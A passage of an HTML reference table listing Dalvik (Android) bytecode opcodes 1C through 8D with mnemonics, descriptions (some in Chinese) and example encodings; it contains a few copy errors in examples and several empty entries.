<td>Moves the class object of a class identified by type_id (e.g. Object.class) into vx.</td>
<td>1C00 0100 - const-class v0, Test3 // type@0001 Moves reference to Test3.class (entry#1 in the type id table) into</td>
</tr>
<tr>
<td>1D</td>
<td>monitor-enter vx</td>
<td>Obtains the monitor of the object referenced by vx.</td>
<td>1D03 - monitor-enter v3 Obtains the monitor of the object referenced by v3.</td>
</tr>
<tr>
<td>1E</td>
<td>monitor-exit</td>
<td>Releases the monitor of the object referenced by vx.</td>
<td>1E03 - monitor-exit v3 Releases the monitor of the object referenced by v3.</td>
</tr>
<tr>
<td>1F</td>
<td>check-cast vx, type_id</td>
<td>Checks whether the object reference in vx can be cast to an instance of a class referenced by type_id. Throws ClassCastException if the cast is not possible, continues execution otherwise.</td>
<td>1F04 0100 - check-cast v4, Test3 // type@0001 Checks whether the object reference in v4 can be cast to type@0001 (entry #1 in the type id table)</td>
</tr>
<tr>
<td>20</td>
<td>instance-of vx,vy,type_id</td>
<td>Checks whether vy is instance of a class identified by type_id. Sets vx non-zero if it is, 0 otherwise.</td>
<td>2040 0100 - instance-of v0, v4, Test3 // type@0001 Checks whether the object reference in v4 is an instance of type@0001 (entry #1 in the type id table). Sets v0 to non-zero if v4 is instance of Test3, 0 otherwise.</td>
</tr>
<tr>
<td>21</td>
<td>array-length vx,vy</td>
<td>Calculates the number of elements of the array referenced by vy and puts the length value into vx.</td>
<td>2111 - array-length v1, v1 Calculates the number of elements of the array referenced by v1 and puts the result into v1.</td>
</tr>
<tr>
<td>22</td>
<td>new-instance vx,type</td>
<td>Instantiates an object type and puts the reference of the newly created instance into vx.</td>
<td>2200 1500 - new-instance v0, java.io.FileInputStream // type@0015 Instantiates type@0015 (entry #15H in the type table) and puts its reference into v0.</td>
</tr>
<tr>
<td>23</td>
<td>new-array vx,vy,type_id</td>
<td>Generates a new array of type_id type and vy element size and puts the reference to the array into vx.</td>
<td>2312 2500 - new-array v2, v1, char[] // type@0025 Generates a new array of type@0025 type and v1 size and puts the reference to the new array into v2.</td>
</tr>
<tr>
<td>24</td>
<td>filled-new-array {parameters},type_id</td>
<td>Generates a new array of type_id and fills it with the parameters5. Reference to the newly generated array can be obtained by a move-result-object instruction, immediately following the filled-new-array instruction.</td>
<td>2420 530D 0000 - filled-new-array {v0,v0},[I // type@0D53 Generates a new array of type@0D53. The array’s size will be 2 and both elements will be filled with the contents of v0 register.</td>
</tr>
<tr>
<td>25</td>
<td>filled-new-array-range {vx..vy},type_id</td>
<td>Generates a new array of type_id and fills it with a range of parameters. Reference to the newly generated array can be obtained by a move-result-object instruction, immediately following the filled-new-array instruction.</td>
<td>2503 0600 1300 - filled-new-array/range {v19..v21}, [B // type@0006 Generates a new array of type@0D53. The array’s size will be 3 and the elements will be filled using the v19,v20 and v21 registers4.</td>
</tr>
<tr>
<td>26</td>
<td>fill-array-data vx,array_data_offset</td>
<td>Fills the array referenced by vx with the static data. The location of the static data is the sum of the position of the current instruction and the offset</td>
<td>2606 2500 0000 - fill-array-data v6, 00e6 // +0025 Fills the array referenced by v0 with the static data at current instruction+25H words location. The offset is expressed as a 32-bit number. The static data is stored in the following format: 0003 // Table type: static array data 0400 // Byte per array element (in this case, 4 byte integers) 0300 0000 // Number of elements in the table 0100 0000 // Element #0: integer 1 0200 0000 // Element #1: integer 2 0300 0000 // Element #2: integer3</td>
</tr>
<tr>
<td>27</td>
<td>throw vx</td>
<td>Throws an exception object. The reference of the exception object is in vx.</td>
<td>2700 - throw v0 Throws an exception. The exception object reference is in v0.</td>
</tr>
<tr>
<td>28</td>
<td>goto target</td>
<td>跳转到 target</td>
<td>28F0 - goto 0005 // -0010 Jumps to current position-16 words (hex 10). 0005 is the label of the target instruction.</td>
</tr>
<tr>
<td>29</td>
<td>goto/16 target</td>
<td>Unconditional jump by 16 bit offset2.</td>
<td>2900 0FFE - goto/16 002f // -01f1 Jumps to the current position-1F1H words. 002F is the label of the target instruction.</td>
</tr>
<tr>
<td>2A</td>
<td>goto/32 target</td>
<td></td>
<td></td>
</tr>
<tr>
<td>2B</td>
<td>packed-switch vx,table</td>
<td>Implements a switch statement where the case constants are close to each other. The instruction uses an index table. vx indexes into this table to find the offset of the instruction for a particular case. If vx falls out of the index table, the execution continues on the next instruction (default case).</td>
<td>2B02 0C00 0000 - packed-switch v2, 000c // +000c Execute a packed switch according to the switch argument in v2. The position of the index table is at current instruction+0CH words. The table looks like the following: 0001 // Table type: packed switch table 0300 // number of elements 0000 0000 // element base 0500 0000 0: 00000005 // case 0: +00000005 0700 0000 1: 00000007 // case 1: +00000007 0900 0000 2: 00000009 // case 2: +00000009</td>
</tr>
<tr>
<td>2C</td>
<td>sparse-switch vx,table</td>
<td>Implements a switch statement with sparse case table. The instruction uses a lookup table with case constants and offsets for each case constant. If there is no match in the table, execution continues on the next instruction (default case).</td>
<td>2C02 0c00 0000 - sparse-switch v2, 000c // +000c Execute a sparse switch according to the switch argument in v2. The position of the lookup table is at current instruction+0CH words. The table looks like the following. 0002 // Table type: sparse switch table 0300 // number of elements 9cff ffff // first case: -100 fa00 0000 // second case constant: 250 e803 0000 // third case constant: 1000 0500 0000 // offset for the first case constant: +5 0700 0000 // offset for the second case constant: +7 0900 0000 // offset for the third case constant: +9</td>
</tr>
<tr>
<td>2D</td>
<td>cmpl-float</td>
<td>Compares the float values in vy and vz and sets the integer value in vx accordingly3</td>
<td>2D00 0607 - cmpl-float v0, v6, v7 Compares the float values in v6 and v7 then sets v0 accordingly. NaN bias is less-than, the instruction will return -1 if any of the parameters is NaN.</td>
</tr>
<tr>
<td>2E</td>
<td>cmpg-float vx, vy, vz</td>
<td>Compares the float values in vy and vz and sets the integer value in vx accordingly3.</td>
<td>2E00 0607 - cmpg-float v0, v6, v7 Compares the float values in v6 and v7 then sets v0 accordingly. NaN bias is greater-than, the instruction will return 1 if any of the parameters is NaN.</td>
</tr>
<tr>
<td>2F</td>
<td>cmpl-double vx,vy,vz</td>
<td>Compares the double values in vy and vz2 and sets the integer value in vx accordingly3.</td>
<td>2F19 0608 - cmpl-double v25, v6, v8 Compares the double values in v6,v7 and v8,v9 and sets v25 accordingly. NaN bias is less-than, the instruction will return -1 if any of the parameters is NaN.</td>
</tr>
<tr>
<td>30</td>
<td>cmpg-double vx, vy, vz</td>
<td>Compares the double values in vy and vz2 and sets the integer value in vx accordingly3.</td>
<td>3000 080A - cmpg-double v0, v8, v10 Compares the double values in v8,v9 and v10,v11 then sets v0 accordingly. NaN bias is greater-than, the instruction will return 1 if any of the parameters is NaN.</td>
</tr>
<tr>
<td>31</td>
<td>cmp-long vx, vy, vz</td>
<td>Compares the long values in vy and vz and sets the integer value in vx accordingly3.</td>
<td>3100 0204 - cmp-long v0, v2, v4 Compares the long values in v2 and v4 then sets v0 accordingly.</td>
</tr>
<tr>
<td>32</td>
<td>if-eq vx, vy, target</td>
<td>如果 vx==vy 2则跳转到 target，vx 和 vy 是整数值</td>
<td>32b3 6600 - if-eq v3, v11, 0080 // +0066 Jumps to the current position+66H words if v3==v11. 0080 is the label of the target instruction.</td>
</tr>
<tr>
<td>33</td>
<td>if-ne vx,vy,target</td>
<td>如果 vx != vy 则跳转到target，vx 和 vy 是整数值。</td>
<td>33A3 1000 - if-ne v3, v10, 002c // +0010 Jumps to the current position+10H words if v3!=v10. 002c is the label of the target instruction.</td>
</tr>
<tr>
<td>34</td>
<td>if-lt vx,vy,target</td>
<td>如果 vx &lt; vy 则跳转到 target，vx 和 vy 是整数值。</td>
<td>3432 CBFF - if-lt v2, v3, 0023 // -0035 Jumps to the current position-35H words if v2&lt;v3. 0023 is the label of the target instruction.</td>
</tr>
<tr>
<td>35</td>
<td>if-ge vx, vy,target</td>
<td>如果 vx &gt;= vy 则跳转到 target，vx 和 vy 是整数值。</td>
<td>3510 1B00 - if-ge v0, v1, 002b // +001b Jumps to the current position+1BH words if v0&gt;=v1. 002b is the label of the target instruction.</td>
</tr>
<tr>
<td>36</td>
<td>if-gt vx,vy,target</td>
<td>如果 vx &gt; vy 则跳转到 target，vx 和 vy 是整数值。</td>
<td>3610 1B00 - if-ge v0, v1, 002b // +001b Jumps to the current position+1BH words if v0&gt;v1. 002b is the label of the target instruction.</td>
</tr>
<tr>
<td>37</td>
<td>if-le vx,vy,target</td>
<td>如果 vx &lt;= vy 则跳转到 target，vx 和 vy 是整数值。</td>
<td>3756 0B00 - if-le v6, v5, 0144 // +000b Jumps to the current position+0BH words if v6&lt;=v5. 0144 is the label of the target instruction.</td>
</tr>
<tr>
<td>38</td>
<td>if-eqz vx,target</td>
<td>如果 vx == 0 则跳转到 target，vx 是一个整数值。</td>
<td>3802 1900 - if-eqz v2, 0038 // +0019 Jumps to the current position+19H words if v2==0. 0038 is the label of the target instruction.</td>
</tr>
<tr>
<td>39</td>
<td>if-nez vx,target</td>
<td>如果 vx != 0 则跳转到 target，vx 是一个整数值。</td>
<td>3902 1200 - if-nez v2, 0014 // +0012 Jumps to current position+18 words (hex 12) if v2 is nonzero. 0014 is the label of the target instruction.</td>
</tr>
<tr>
<td>3A</td>
<td>if-ltz vx,target</td>
<td>Checks vx and jumps if vx&lt;02.</td>
<td>3A00 1600 - if-ltz v0, 002d // +0016 Jumps to the current position+16H words if v0&lt;0. 002d is the label of the target instruction.</td>
</tr>
<tr>
<td>3B</td>
<td>if-gez vx,target</td>
<td>Checks vx and jumps if vx&gt;=02.</td>
<td>3B00 1600 - if-gez v0, 002d // +0016 Jumps to the current position+16H words if v0 &gt;=0. 002d is the label of the target instruction.</td>
</tr>
<tr>
<td>3C</td>
<td>if-gtz vx,target</td>
<td>Checks vx and jumps if vx&gt;02.</td>
<td>3C00 1D00 - if-gtz v0, 004a // +001d Jumps to the current position+1DH words if v0&gt;0. 004A is the label of the target instruction.</td>
</tr>
<tr>
<td>3D</td>
<td>if-lez vx,target</td>
<td>Checks vx and jumps if vx&lt;=02.</td>
<td>3D00 1D00 - if-lez v0, 004a // +001d Jumps to the current position+1DH words if v0&lt;=0. 004A is the label of the target instruction.</td>
</tr>
<tr>
<td>3E</td>
<td>unused_3E</td>
<td></td>
<td></td>
</tr>
<tr>
<td>3F</td>
<td>unused_3F</td>
<td></td>
<td></td>
</tr>
<tr>
<td>40</td>
<td>unused_40</td>
<td></td>
<td></td>
</tr>
<tr>
<td>41</td>
<td>unused_41</td>
<td></td>
<td></td>
</tr>
<tr>
<td>42</td>
<td>unused_42</td>
<td></td>
<td></td>
</tr>
<tr>
<td>43</td>
<td>unused_43</td>
<td></td>
<td></td>
</tr>
<tr>
<td>44</td>
<td>aget vx,vy,vz</td>
<td>Gets an integer value of an object reference array into vx. The array is referenced by vy and is indexed by vz.</td>
<td>4407 0306 - aget v7, v3, v6 Gets an integer array element. The array is referenced by v3 and the element is indexed by v6. The element will be put into v7.</td>
</tr>
<tr>
<td>45</td>
<td>aget-wide vx,vy,vz</td>
<td>Gets a long/double value of long/double array into vx,vx+1. The array is referenced by vy and is indexed by vz.</td>
<td>4505 0104 - aget-wide v5, v1, v4 Gets a long/double array element. The array is referenced by v1 and the element is indexed by v4. The element will be put into v5,v6.</td>
</tr>
<tr>
<td>46</td>
<td>aget-object vx,vy,vz</td>
<td>Gets an object reference value of an object reference array into vx. The array is referenced by vy and is indexed by vz.</td>
<td>4602 0200 - aget-object v2, v2, v0 Gets an object reference array element. The array is referenced by v2 and the element is indexed by v0. The element will be put into v2.</td>
</tr>
<tr>
<td>47</td>
<td>aget-boolean vx,vy,vz</td>
<td>Gets a boolean value of a boolean array into vx. The array is referenced by vy and is indexed by vz.</td>
<td>4700 0001 - aget-boolean v0, v0, v1  Gets a boolean array element. The array is referenced by v0 and the element is indexed by v1. The element will be put into v0.</td>
</tr>
<tr>
<td>48</td>
<td>aget-byte vx,vy,vz</td>
<td>Gets a byte value of a byte array into vx. The array is referenced by vy and is indexed by vz.</td>
<td>4800 0001 - aget-byte v0, v0, v1 Gets a byte array element. The array is referenced by v0 and the element is indexed by v1. The element will be put into v0.</td>
</tr>
<tr>
<td>49</td>
<td>aget-char vx, vy,vz</td>
<td>Gets a char value of a character array into vx. The element is indexed by vz, the array object is referenced by vy</td>
<td>4905 0003 - aget-char v5, v0, v3 Gets a character array element. The array is referenced by v0 and the element is indexed by v3. The element will be put into v5.</td>
</tr>
<tr>
<td>4A</td>
<td>aget-short vx,vy,vz</td>
<td>Gets a short value of a short array into vx. The element is indexed by vz, the array object is referenced by vy.</td>
<td>4A00 0001 - aget-short v0, v0, v1 Gets a short array element. The array is referenced by v0 and the element is indexed by v1. The element will be put into v0.</td>
</tr>
<tr>
<td>4B</td>
<td>aput vx,vy,vz</td>
<td>Puts the integer value in vx into an element of an integer array. The element is indexed by vz, the array object is referenced by vy.</td>
<td>4B00 0305 - aput v0, v3, v5 Puts the integer value in v2 into an integer array referenced by v0. The target array element is indexed by v1.</td>
</tr>
<tr>
<td>4C</td>
<td>aput-wide vx,vy,vz</td>
<td>Puts the double/long value in vx,vx+1 into a double/long array. The array is referenced by vy, the element is indexed by vz.</td>
<td>4C05 0104 - aput-wide v5, v1, v4 Puts the double/long value in v5,v6 into a double/long array referenced by v1. The target array element is indexed by v4.</td>
</tr>
<tr>
<td>4D</td>
<td>aput-object vx,vy,vz</td>
<td>Puts the object reference value in vx into an element of an object reference array. The element is indexed by vz, the array object is referenced by vy.</td>
<td>4D02 0100 - aput-object v2, v1, v0 Puts the object reference value in v2 into an object reference array referenced by v0. The target array element is indexed by v1.</td>
</tr>
<tr>
<td>4E</td>
<td>aput-boolean vx,vy,vz</td>
<td>Puts the boolean value in vx into an element of a boolean array. The element is indexed by vz, the array object is referenced by vy.</td>
<td>4E01 0002 - aput-boolean v1, v0, v2 Puts the boolean value in v1 into an object reference array referenced by v0. The target array element is indexed by v2.</td>
</tr>
<tr>
<td>4F</td>
<td>aput-byte vx,vy,vz</td>
<td>Puts the byte value in vx into an element of a byte array. The element is indexed by vz, the array object is referenced by vy.</td>
<td>4F02 0001 - aput-byte v2, v0, v1 Puts the boolean value in v2 into a byte array referenced by v0. The target array element is indexed by v1.</td>
</tr>
<tr>
<td>50</td>
<td>aput-char vx,vy,vz</td>
<td>Puts the char value in vx into an element of a character array. The element is indexed by vz, the array object is referenced by vy.</td>
<td>5003 0001 - aput-char v3, v0, v1 Puts the character value in v3 into a character array referenced by v0. The target array element is indexed by v1.</td>
</tr>
<tr>
<td>51</td>
<td>aput-short vx,vy,vz</td>
<td>Puts the short value in vx into an element of a short array. The element is indexed by vz, the array object is referenced by vy.</td>
<td>5102 0001 - aput-short v2, v0, v1 Puts the short value in v2 into a character array referenced by v0. The target array element is indexed by v1.</td>
</tr>
<tr>
<td>52</td>
<td>iget vx, vy, field_id</td>
<td>Reads an instance field into vx. The instance is referenced by vy.</td>
<td>5210 0300 - iget v0, v1, Test2.i6:I // field@0003 Reads field@0003 into v0 (entry #3 in the field id table). The instance is referenced by v1.</td>
</tr>
<tr>
<td>53</td>
<td>iget-wide vx,vy,field_id</td>
<td>Reads an instance field into vx1. The instance is referenced by vy.</td>
<td>5320 0400 - iget-wide v0, v2, Test2.l0:J // field@0004 Reads field@0004 into v0 and v1 registers (entry #4 in the field id table). The instance is referenced by v2.</td>
</tr>
<tr>
<td>54</td>
<td>iget-object vx,vy,field_id</td>
<td>Reads an object reference instance field into vx. The instance is referenced by vy.</td>
<td>iget-object v1, v2, LineReader.fis:Ljava/io/FileInputStream; // field@0002 Reads field@0002 into v1 (entry #2 in the field id table). The instance is referenced by v2.</td>
</tr>
<tr>
<td>55</td>
<td>iget-boolean vx,vy,field_id</td>
<td>Reads a boolean instance field into vx. The instance is referenced by vy.</td>
<td>55FC 0000 - iget-boolean v12, v15, Test2.b0:Z // field@0000 Reads the boolean field@0000 into v12 register (entry #0 in the field id table). The instance is referenced by v15.</td>
</tr>
<tr>
<td>56</td>
<td>iget-byte vx,vy,field_id</td>
<td>Reads a byte instance field into vx. The instance is referenced by vy.</td>
<td>5632 0100 - iget-byte v2, v3, Test3.bi1:B // field@0001 Reads the char field@0001 into v2 register (entry #1 in the field id table). The instance is referenced by v3.</td>
</tr>
<tr>
<td>57</td>
<td>iget-char vx,vy,field_id</td>
<td>Reads a char instance field into vx. The instance is referenced by vy.</td>
<td>5720 0300 - iget-char v0, v2, Test3.ci1:C // field@0003 Reads the char field@0003 into v0 register (entry #3 in the field id table). The instance is referenced by v2.</td>
</tr>
<tr>
<td>58</td>
<td>iget-short vx,vy,field_id</td>
<td>Reads a short instance field into vx. The instance is referenced by vy.</td>
<td>5830 0800 - iget-short v0, v3, Test3.si1:S // field@0008 Reads the short field@0008 into v0 register (entry #8 in the field id table). The instance is referenced by v3.</td>
</tr>
<tr>
<td>59</td>
<td>iput vx,vy, field_id</td>
<td>Puts vx into an instance field. The instance is referenced by vy.</td>
<td>5920 0200 - iput v0,v2, Test2.i6:I // field@0002 Stores v0 into field@0002 (entry #2 in the field id table). The instance is referenced by v2.</td>
</tr>
<tr>
<td>5A</td>
<td>iput-wide vx,vy, field_id</td>
<td>Puts the wide value located in vx and vx+1 registers into an instance field. The instance is referenced by vy.</td>
<td>5A20 0000 - iput-wide v0,v2, Test2.d0:D // field@0000  Stores the wide value in v0, v1 registers into field@0000 (entry #0 in the field id table). The instance is referenced by v2.</td>
</tr>
<tr>
<td>5B</td>
<td>iput-object vx,vy,field_id</td>
<td>Puts the object reference in vx into an instance field. The instance is referenced by vy.</td>
<td>5B20 0000 - iput-object v0, v2, LineReader.bis:Ljava/io/BufferedInputStream; // field@0000 Stores the object reference in v0 into field@0000 (entry #0 in the field table). The instance is referenced by v2.</td>
</tr>
<tr>
<td>5C</td>
<td>iput-boolean vx,vy, field_id</td>
<td>Puts the boolean value located in vx into an instance field. The instance is referenced by vy.</td>
<td>5C30 0000 - iput-boolean v0, v3, Test2.b0:Z // field@0000 Puts the boolean value in v0 into field@0000 (entry #0 in the field id table). The instance is referenced by v3.</td>
</tr>
<tr>
<td>5D</td>
<td>iput-byte vx,vy,field_id</td>
<td>Puts the byte value located in vx into an instance field. The instance is referenced by vy.</td>
<td>5D20 0100 - iput-byte v0, v2, Test3.bi1:B // field@0001 Puts the boolean value in v0 into field@0001 (entry #1 in the field id table). The instance is referenced by v2.</td>
</tr>
<tr>
<td>5E</td>
<td>iput-char vx,vy,field_id</td>
<td>Puts the char value located in vx into an instance field. The instance is referenced by vy.</td>
<td>5E20 0300 - iput-char v0, v2, Test3.ci1:C // field@0003 Puts the char value in v0 into field@0003 (entry #3 in the field id table). The instance is referenced by v2.</td>
</tr>
<tr>
<td>5F</td>
<td>iput-short vx,vy,field_id</td>
<td>Puts the short value located in vx into an instance field. The instance is referenced by vy.</td>
<td>5F21 0800 - iput-short v1, v2, Test3.si1:S // field@0008 Puts the short value in v1 into field@0008 (entry #8 in the field id table). The instance is referenced by v2.</td>
</tr>
<tr>
<td>60</td>
<td>sget vx,field_id</td>
<td>Reads the integer field identified by the field_id into vx.</td>
<td>6000 0700 - sget v0, Test3.is1:I // field@0007 Reads field@0007 (entry #7 in the field id table) into v0.</td>
</tr>
<tr>
<td>61</td>
<td>sget-wide vx, field_id</td>
<td>Reads the static field identified by the field_id into vx and vx+1 registers.</td>
<td>6100 0500 - sget-wide v0, Test2.l1:J // field@0005 Reads field@0005 (entry #5 in the field id table) into v0 and v1 registers.</td>
</tr>
<tr>
<td>62</td>
<td>sget-object vx,field_id</td>
<td>Reads the object reference field identified by the field_id into vx.</td>
<td>6201 0C00 - sget-object v1, Test3.os1:Ljava/lang/Object; // field@000c Reads field@000c (entry #CH in the field id table) into v1.</td>
</tr>
<tr>
<td>63</td>
<td>sget-boolean vx,field_id</td>
<td>Reads the boolean static field identified by the field_id into vx.</td>
<td>6300 0C00 - sget-boolean v0, Test2.sb:Z // field@000c Reads boolean field@000c (entry #12 in the field id table) into v0.</td>
</tr>
<tr>
<td>64</td>
<td>sget-byte vx,field_id</td>
<td>Reads the byte static field identified by the field_id into vx.</td>
<td>6400 0200 - sget-byte v0, Test3.bs1:B // field@0002 Reads byte field@0002 (entry #2 in the field id table) into v0.</td>
</tr>
<tr>
<td>65</td>
<td>sget-char vx,field_id</td>
<td>Reads the char static field identified by the field_id into vx.</td>
<td>6500 0700 - sget-char v0, Test3.cs1:C // field@0007 Reads byte field@0007 (entry #7 in the field id table) into v0.</td>
</tr>
<tr>
<td>66</td>
<td>sget-short vx,field_id</td>
<td>Reads the short static field identified by the field_id into vx.</td>
<td>6600 0B00 - sget-short v0, Test3.ss1:S // field@000b Reads short field@000b (entry #BH in the field id table) into v0.</td>
</tr>
<tr>
<td>67</td>
<td>sput vx, field_id</td>
<td>Puts vx into a static field.</td>
<td>6700 0100 - sput v0, Test2.i5:I // field@0001 Stores v0 into field@0001 (entry #1 in the field id table).</td>
</tr>
<tr>
<td>68</td>
<td>sput-wide vx, field_id</td>
<td>Puts vx and vx+1 into a static field.</td>
<td>6800 0500 - sput-wide v0, Test2.l1:J // field@0005 Puts the long value in v0 and v1 into the field@0005 static field (entry #5 in the field id table).</td>
</tr>
<tr>
<td>69</td>
<td>sput-object vx,field_id</td>
<td>Puts object reference in vx into a static field.</td>
<td>6900 0c00 - sput-object v0, Test3.os1:Ljava/lang/Object; // field@000c Puts the object reference value in v0 into the field@000c static field (entry #CH in the field id table).</td>
</tr>
<tr>
<td>6A</td>
<td>sput-boolean vx,field_id</td>
<td>Puts boolean value in vx into a static field.</td>
<td>6A00 0300 - sput-boolean v0, Test3.bls1:Z // field@0003 Puts the byte value in v0 into the field@0003 static field (entry #3 in the field id table).</td>
</tr>
<tr>
<td>6B</td>
<td>sput-byte vx,field_id</td>
<td>Puts byte value in vx into a static field.</td>
<td>6B00 0200 - sput-byte v0, Test3.bs1:B // field@0002 Puts the byte value in v0 into the field@0002 static field (entry #2 in the field id table).</td>
</tr>
<tr>
<td>6C</td>
<td>sput-char vx,field_id</td>
<td>Puts char value in vx into a static field.</td>
<td>6C01 0700 - sput-char v1, Test3.cs1:C // field@0007 Puts the char value in v1 into the field@0007 static field (entry #7 in the field id table).</td>
</tr>
<tr>
<td>6D</td>
<td>sput-short vx,field_id</td>
<td>Puts short value in vx into a static field.</td>
<td>6D00 0B00 - sput-short v0, Test3.ss1:S // field@000b Puts the short value in v0 into the field@000b static field (entry #BH in the field id table).</td>
</tr>
<tr>
<td>6E</td>
<td>invoke-virtual { parameters }, methodtocall</td>
<td>Invokes a virtual method with parameters.</td>
<td>6E53 0600 0421 - invoke-virtual { v4, v0, v1, v2, v3}, Test2.method5:(IIII)V // method@0006 Invokes the 6th method in the method table with the following arguments: v4 is the “this” instance, v0, v1, v2, and v3 are the method parameters. The method has 5 arguments (4 MSB bits of the second byte)5.</td>
</tr>
<tr>
<td>6F</td>
<td>invoke-super {parameter},methodtocall</td>
<td>Invokes the virtual method of the immediate parent class.</td>
<td>6F10 A601 0100 invoke-super {v1},java.io.FilterOutputStream.close:()V // method@01a6 Invokes method@01a6 with one parameter, v1.</td>
</tr>
<tr>
<td>70</td>
<td>invoke-direct { parameters }, methodtocall</td>
<td>Invokes a method with parameters without the virtual method resolution.</td>
<td>7010 0800 0100 - invoke-direct {v1}, java.lang.Object.<init>:()V // method@0008 Invokes the 8th method in the method table with just one parameter, v1 is the “this” instance5.</init></td>
</tr>
<tr>
<td>71</td>
<td>invoke-static {parameters}, methodtocall</td>
<td>Invokes a static method with parameters.</td>
<td>7110 3400 0400 - invoke-static {v4}, java.lang.Integer.parseInt:( Ljava/lang/String;)I // method@0034 Invokes method@34 static method. The method is called with one parameter, v45.</td>
</tr>
<tr>
<td>72</td>
<td>invoke-interface {parameters},methodtocall</td>
<td>Invokes an interface method.</td>
<td>7240 2102 3154 invoke-interface {v1, v3, v4, v5}, mwfw.IReceivingProtocolAdapter.receivePackage:( ILjava/lang/String;Ljava/io/InputStream;)Z // method@0221 Invokes method@221 interface method using parameters in v1,v3,v4 and v55.</td>
</tr>
<tr>
<td>73</td>
<td>unused_73</td>
<td></td>
<td></td>
</tr>
<tr>
<td>74</td>
<td>invoke-virtual/range {vx..vy},methodtocall</td>
<td>Invokes virtual method with a range of registers. The instruction specifies the first register and the number of registers to be passed to the method.</td>
<td>7403 0600 1300 - invoke-virtual {v19..v21}, Test2.method5:(IIII)V // method@0006 Invokes the 6th method in the method table with the following arguments: v19 is the “this” instance, v20 and v21 are the method parameters.</td>
</tr>
<tr>
<td>75</td>
<td>invoke-super/range</td>
<td>Invokes the virtual method of the immediate parent class. The instruction specifies the first register and the number of registers to be passed to the method.</td>
<td>7501 A601 0100 invoke-super {v1},java.io.FilterOutputStream.close:()V // method@01a6 Invokes method@01a6 with one parameter, v1.</td>
</tr>
<tr>
<td>76</td>
<td>invoke-direct/range {vx..vy},methodtocall</td>
<td>Invokes direct method with a range of registers. The instruction specifies the first register and the number of registers to be passed to the method.</td>
<td>7603 3A00 1300 - invoke-direct/range {v19..21},java.lang.Object.<init>:()V // method@003a Invokes method@3A with 1 parameters (second byte of the instruction=03). The parameter is stored in v19 (5th,6th bytes of the instruction).</init></td>
</tr>
<tr>
<td>77</td>
<td>invoke-static/range {vx..vy},methodtocall</td>
<td>Invokes static method with a range of registers. The instruction specifies the first register and the number of registers to be passed to the method.</td>
<td>7703 3A00 1300 - invoke-static/range {v19..21},java.lang.Integer.parseInt:( Ljava/lang/String;)I // method@0034 Invokes method@3A with 1 parameters (second byte of the instruction=03). The parameter is stored in v19 (5th,6th bytes of the instruction).</td>
</tr>
<tr>
<td>78</td>
<td>invoke-interface-range</td>
<td>Invokes an interface method with a range of registers. The instruction specifies the first register and the number of registers to be passed to the method.</td>
<td>7840 2102 0100 invoke-interface {v1..v4}, mwfw.IReceivingProtocolAdapter.receivePackage:( ILjava/lang/String;Ljava/io/InputStream;)Z // method@0221 Invokes method@221 interface method using parameters in v1..v4.</td>
</tr>
<tr>
<td>79</td>
<td>unused_79</td>
<td></td>
<td></td>
</tr>
<tr>
<td>7A</td>
<td>unused_7A</td>
<td></td>
<td></td>
</tr>
<tr>
<td>7B</td>
<td>neg-int vx,vy</td>
<td>Calculates vx=-vy.</td>
<td>7B01 - neg-int v1,v0 Calculates -v0 and stores the result in v1.</td>
</tr>
<tr>
<td>7C</td>
<td>not-int vx,vy</td>
<td></td>
<td></td>
</tr>
<tr>
<td>7D</td>
<td>neg-long vx,vy</td>
<td>Calculates vx,vx+1=-(vy,vy+1)</td>
<td>7D02 - neg-long v2,v0 Calculates -(v0,v1) and stores the result into (v2,v3)</td>
</tr>
<tr>
<td>7E</td>
<td>not-long vx,vy</td>
<td></td>
<td></td>
</tr>
<tr>
<td>7F</td>
<td>neg-float vx,vy</td>
<td>Calculates vx=-vy</td>
<td>7F01 - neg-float v1,v0 Calculates -v0 and stores the result into v1.</td>
</tr>
<tr>
<td>80</td>
<td>neg-double vx,vy</td>
<td>Calculates vx,vx+1=-(vy,vy+1)</td>
<td>8002 - neg-double v2,v0 Calculates -(v0,v1) and stores the result into (v2,v3)</td>
</tr>
<tr>
<td>81</td>
<td>int-to-long vx, vy</td>
<td>Converts the integer in vy into a long in vx,vx+1.</td>
<td>8106 - int-to-long v6, v0 Converts an integer in v0 into a long in v6,v7.</td>
</tr>
<tr>
<td>82</td>
<td>int-to-float vx, vy</td>
<td>Converts the integer in vx into a float in vx.</td>
<td>8206 - int-to-float v6, v0 Converts the integer in v0 into a float in v6.</td>
</tr>
<tr>
<td>83</td>
<td>int-to-double vx, vy</td>
<td>Converts the integer in vy into the double in vx,vx+1.</td>
<td>8306 - int-to-double v6, v0 Converts the integer in v0 into a double in v6,v7</td>
</tr>
<tr>
<td>84</td>
<td>long-to-int vx,vy</td>
<td>Converts the long value in vy,vy+1 into an integer in vx.</td>
<td>8424 - long-to-int v4, v2 Converts the long value in v2,v3 into an integer value in v4.</td>
</tr>
<tr>
<td>85</td>
<td>long-to-float vx, vy</td>
<td>Converts the long value in vy,vy+1 into a float in vx.</td>
<td>8510 - long-to-float v0, v1 Convcerts the long value in v1,v2 into a float value in v0.</td>
</tr>
<tr>
<td>86</td>
<td>long-to-double vx, vy</td>
<td>Converts the long value in vy,vy+1 into a double value in vx,vx+1.</td>
<td>8610 - long-to-double v0, v1 Converts the long value in v1,v2 into a double value in v0,v1.</td>
</tr>
<tr>
<td>87</td>
<td>float-to-int vx, vy</td>
<td>Converts the float value in vy into an integer value in vx.</td>
<td>8730 - float-to-int v0, v3 Converts the float value in v3 into an integer value in v0.</td>
</tr>
<tr>
<td>88</td>
<td>float-to-long vx,vy</td>
<td>Converts the float value in vy into a long value in vx.</td>
<td>8830 - float-to-long v0, v3 Converts the float value in v3 into a long value in v0,v1.</td>
</tr>
<tr>
<td>89</td>
<td>float-to-double vx, vy</td>
<td>Converts the float value in vy into a double value in vx,vx+1.</td>
<td>8930 - float-to-double v0, v3 Converts the float value in v3 into a double value in v0,v1.</td>
</tr>
<tr>
<td>8A</td>
<td>double-to-int vx, vy</td>
<td>Converts the double value in vy,vy+1 into an integer value in vx.</td>
<td>8A40 - double-to-int v0, v4 Converts the double value in v4,v5 into an integer value in v0.</td>
</tr>
<tr>
<td>8B</td>
<td>double-to-long vx, vy</td>
<td>Converts the double value in vy,vy+1 into a long value in vx,vx+1.</td>
<td>8B40 - double-to-long v0, v4 Converts the double value in v4,v5 into a long value in v0,v1.</td>
</tr>
<tr>
<td>8C</td>
<td>double-to-float vx, vy</td>
<td>Converts the double value in vy,vy+1 into a float value in vx.</td>
<td>8C40 - double-to-float v0, v4 Converts the double value in v4,v5 into a float value in v0,v1.</td>
</tr>
<tr>
<td>8D</td>
<td>int-to-byte vx,vy</td>
<td>Converts the int value in vy to a byte value and stores it in vx.</td>
